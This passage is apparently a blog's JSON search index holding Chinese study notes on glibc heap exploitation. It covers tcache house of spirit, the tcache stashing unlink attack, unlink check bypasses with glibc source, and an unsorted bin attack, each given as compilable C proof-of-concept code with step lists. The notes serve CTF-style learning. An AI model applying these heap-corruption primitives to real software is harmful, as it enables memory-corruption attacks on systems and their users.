%p]\\n\u0026#34;, b, a); printf(\u0026#34;Due to safe-linking, the value actually stored at b[0] is: %#lx\\n\u0026#34;, b[0]); // step 3: recover the values puts(\u0026#34;Now decrypt the poisoned value\u0026#34;); long plaintext = decrypt(b[0]); printf(\u0026#34;value: %p\\n\u0026#34;, a); printf(\u0026#34;recovered value: %#lx\\n\u0026#34;, plaintext); assert(plaintext == (long)a); } Tcache house of spirit #\rPOC\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region malloc(1); fake_chunks[1] = 0x40; // this is the size a = \u0026amp;fake_chunks[2]; free(a); void *b = malloc(0x30); printf(\u0026#34;malloc(0x30): %p\\n\u0026#34;, b); assert((long)b == (long)\u0026amp;fake_chunks[2]); } Tcache stashing unlink attack #\rPOC\n1 //gcc -g -no-pie hollk.c -o hollk 2 //patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk 3 //patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk 4 #include \u0026lt;stdio.h\u0026gt; 5 #include \u0026lt;stdlib.h\u0026gt; 6 #include \u0026lt;assert.h\u0026gt; 7 8 int main(){ 9 unsigned long stack_var[0x10] = {0}; 10 unsigned long *chunk_lis[0x10] = {0}; 11 unsigned long *target; 12 13 setbuf(stdout, NULL); 14 15 printf(\u0026#34;stack_var addr is:%p\\n\u0026#34;,\u0026amp;stack_var[0]); 16 printf(\u0026#34;chunk_lis addr is:%p\\n\u0026#34;,\u0026amp;chunk_lis[0]); 17 printf(\u0026#34;target addr is:%p\\n\u0026#34;,(void*)target); 18 19 stack_var[3] = (unsigned long)(\u0026amp;stack_var[2]); 20 21 for(int i = 0;i \u0026lt; 9;i++){ 22 chunk_lis[i] = (unsigned long*)malloc(0x90); 23 } 24 25 for(int i = 3;i \u0026lt; 9;i++){ 26 free(chunk_lis[i]); 27 } 28 29 free(chunk_lis[1]); 30 free(chunk_lis[0]); 31 free(chunk_lis[2]); 32 33 malloc(0xa0); 34 malloc(0x90); 35 malloc(0x90); 36 37 chunk_lis[2][1] = (unsigned long)stack_var; 38 calloc(1,0x90); 39 40 target = malloc(0x90); 41 42 printf(\u0026#34;target now: %p\\n\u0026#34;,(void*)target); 43 44 assert(target == \u0026amp;stack_var[2]); 45 return 0; 46 } 知识点：\ncalloc分配内存 calloc不会从fastbins和tcache bin中分配内存（即使请求大小匹配），因为fastbins的chunk可能未合并，无法保证连续空间。 分配时优先从smallbins/unsortedbins或top chunk切割。 calloc从small bin 中拿出一个空闲chunk后，会将其余chunk放入tcache bin 中（直到填满），并且只会检测对第一个 chunk进行了完整性检查，后面的chunk的检查缺失，就造成了fake chunk。 攻击步骤：\nmalloc(0x90)大小的 9个chunk free 7 个chunk 填满 tcache bin free 2 个chunk（chunk0、chunk2） 放入unsorted bin malloc(0xa0)大小的chunk，由于unsorted bin存取机制的原因，unsorted bin中如果没有符合chunk size的空闲块（chunk0、chunk2 size小于0xb0），那么unsorted bin中的空闲块会按照size分配到在small bin或large bin的链表中。 chunk0、chunk2被放入 small bin中 修改 chunk2 中的bk指向目标地址fake_chunk 使用calloc分配地址，触发calloc的机制，分配chunk0，检测chunk2，并将small bin中的chunk放入tcache中，直到填满。 malloc(0x90) ,得到fake chunk。 ","externalUrl":null,"permalink":"/posts/pwn/heap/tcache_attack/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"\rUnlink #\runlink 源码 #\rstatic void unlink_chunk (mstate av, mchunkptr p) { if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); mchunkptr fd = p-\u0026gt;fd; mchunkptr bk = p-\u0026gt;bk; if (__builtin_expect (fd-\u0026gt;bk != p || bk-\u0026gt;fd != p, 0)) malloc_printerr (\u0026#34;corrupted double-linked list\u0026#34;); fd-\u0026gt;bk = bk; bk-\u0026gt;fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) \u0026amp;\u0026amp; p-\u0026gt;fd_nextsize != NULL) { if (p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != p || p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != p) malloc_printerr (\u0026#34;corrupted double-linked list (not small)\u0026#34;); if (fd-\u0026gt;fd_nextsize == NULL) { if (p-\u0026gt;fd_nextsize == p) fd-\u0026gt;fd_nextsize = fd-\u0026gt;bk_nextsize = fd; else { fd-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; fd-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = fd; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = fd; } } else { p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; } } } unlink检测机制 #\r// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查) if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); \\ // 检查 fd 和 bk 指针(双向链表完整性检查) if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0)) \\ malloc_printerr (check_action, \u0026#34;corrupted double-linked list\u0026#34;, P, AV); \\ // largebin 中 next_size 双向链表完整性检查 if (__builtin_expect (P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \u0026#34;corrupted double-linked list (not small)\u0026#34;, \\ P, AV); unlink 攻击 #\r现在有两个物理相邻的 chunk 分别是 Q 和 P\n在Q 中构造 fake chunk ，绕过检测需要构造FD和BK 如： FD = \u0026amp;P - 0x18 ，BK = \u0026amp;P - 0x10\n再伪造P的prev_size 为 fake chunk 的大小，并将其 prev_inuse 位清空。\nfree P 触发 unlink，\n最后会向 \u0026amp;P 中 填入 \u0026amp;P - 0x18的地址。\n绕过检测 #\r绕过if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) 1.伪造的 fakechunk的 next chunk的prev_size 为 fake chunk 的大小，并将其 prev_inuse 位清空\n绕过if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0)) 我们需要一个fake_chunk。 制造 FD -\u0026gt; bk 和 BK -\u0026gt; fd 为 P的地址。 因此 FD 和 BK 可以找存放P指针的内存空间就是 \u0026amp;P。 FD = \u0026amp;P - 0x18 ，BK = \u0026amp;P - 0x10。 ","externalUrl":null,"permalink":"/posts/pwn/heap/unlink/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"\rUnsorted_bin_attack #\rLink main_arena #\rmalloc chunk1，chunk2\nfree chunk1\n通过UAF打印chunk1中FD的值，就是main_arena + 96 的地址。\nmain_arena_offset 计算。libc2\nmain_arena_offset = ELF(\u0026#34;libc.so.6\u0026#34;).symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 Glibc 2.27 unsorted bin attack #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main(){ volatile unsigned long stack_var=0; unsigned long *p=malloc(0x410); malloc(500); free(p); p[1]=(unsigned long)(\u0026amp;stack_var-2); malloc(0x410); fprintf(stderr, \u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var, (void*)stack_var); assert(stack_var != 0); } ","externalUrl":null,"permalink":"/posts/pwn/heap/unsorted_bin_attack/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/en/","section":"Tea","summary":"","title":"Tea","type":"page"}]